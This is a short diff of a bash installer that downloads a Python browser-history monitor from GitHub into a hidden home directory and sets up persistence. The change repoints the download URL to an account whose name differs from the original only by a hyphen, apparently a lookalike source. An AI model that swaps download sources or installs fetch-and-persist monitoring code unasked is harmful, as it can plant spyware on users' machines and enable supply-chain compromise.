@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Configuration
-SOURCE_URL="https://raw.githubusercontent.com/FranceCyberDefense/BrowserHistory/refs/heads/main/browser-history-monitor.py"
+SOURCE_URL="https://raw.githubusercontent.com/France-CyberDefense/BrowserHistory/refs/heads/main/browser-history-monitor.py"
 INSTALL_DIR="$HOME/.browser-monitor"
 SCRIPT_NAME="browser-history-monitor.py"
 DEST_PATH="$INSTALL_DIR/$SCRIPT_NAME"
@@ -187,3 +187,4 @@ else
     echo -e "${RED}[-] Unsupported Operating System for automatic persistence.${NC}"
     echo "    Script downloaded to $DEST_PATH. Please run manually."
 fi
+
